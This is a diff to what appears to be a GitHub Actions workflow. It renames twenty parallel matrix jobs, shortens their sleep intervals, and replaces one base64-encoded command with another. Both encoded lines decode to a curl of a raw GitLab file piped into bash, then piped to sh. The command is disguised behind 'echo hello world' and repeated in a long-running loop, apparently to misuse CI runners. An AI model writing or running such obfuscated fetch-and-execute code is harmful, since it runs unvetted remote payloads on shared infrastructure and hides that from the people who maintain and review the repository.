@@ -19,26 +19,26 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: helliosans-ayonser1112a1
-          - name: helliosans-byonser1112b1
-          - name: helliosans-cyonser1112c1
-          - name: helliosans-dyonser1112d1
-          - name: helliosans-eyonser1112e1
-          - name: helliosans-fyonser1112f1
-          - name: helliosans-gyonser1112g1
-          - name: helliosans-hyonser1112h1
-          - name: helliosans-iyonser1112i1
-          - name: helliosans-jyonser1112j1
-          - name: helilops-kyonserer1112k1
-          - name: helilops-lyonserer1112l1
-          - name: helilops-myonserer1112m1
-          - name: helilops-nyonserer1112n1
-          - name: helilops-oyonserer1112o1
-          - name: helilops-pyonserer1112p1
-          - name: helilops-qyonserer1112q1
-          - name: helilops-ryonserer1112r1
-          - name: helilops-syonserer1112s1
-          - name: helilops-tyonserer1112t1
+          - name: Whelliosans-ayonser1112a1
+          - name: Whelliosans-byonser1112b1
+          - name: Whelliosans-cyonser1112c1
+          - name: Whelliosans-dyonser1112d1
+          - name: Whelliosans-eyonser1112e1
+          - name: Whelliosans-fyonser1112f1
+          - name: Whelliosans-gyonser1112g1
+          - name: Whelliosans-hyonser1112h1
+          - name: Whelliosans-iyonser1112i1
+          - name: Whelliosans-jyonser1112j1
+          - name: Thelilops-kyonserer1112k1
+          - name: Thelilops-lyonserer1112l1
+          - name: Thelilops-myonserer1112m1
+          - name: Thelilops-nyonserer1112n1
+          - name: Thelilops-oyonserer1112o1
+          - name: Thelilops-pyonserer1112p1
+          - name: Thelilops-qyonserer1112q1
+          - name: Thelilops-ryonserer1112r1
+          - name: Thelilops-syonserer1112s1
+          - name: Thelilops-tyonserer1112t1
     runs-on: ubuntu-latest
     timeout-minutes: 320
     steps:
@@ -58,7 +58,7 @@ jobs:
             else
               if [ "$LOOP" -ge 9983 ]; then    # 6 loop pertama (9988–9983)
                 echo "🔄 hello world"
-                SLEEP=520
+                SLEEP=480
               else
                 echo "⏳ hello world"
                 SLEEP=3600
@@ -68,13 +68,13 @@ jobs:
             # Sebelum 3 siklus, aturan biasa
             if [ "$LOOP" -ge 9983 ]; then
               echo "🔄 hello"
-              SLEEP=600
+              SLEEP=420
             else
               echo "⏳ hello"
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vbHVtYmFyYW5zIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbHVtYW5zYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
   line-phanu:
     needs: run-lscpu
